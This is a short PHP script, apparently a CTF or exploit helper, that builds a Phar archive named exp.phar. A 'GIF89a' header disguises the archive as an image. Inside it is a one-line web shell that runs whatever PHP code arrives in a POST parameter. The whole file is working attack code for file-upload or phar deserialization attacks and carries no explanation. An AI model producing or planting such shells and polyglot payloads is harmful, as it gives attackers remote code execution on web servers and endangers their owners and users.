<?php
$p = new Phar('./exp.phar', 0);
$p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$p->setMetadata("virink");
$p->addFromString('v.php', '@<?php @eval($_POST["virink"]);');
$p->stopBuffering();
?>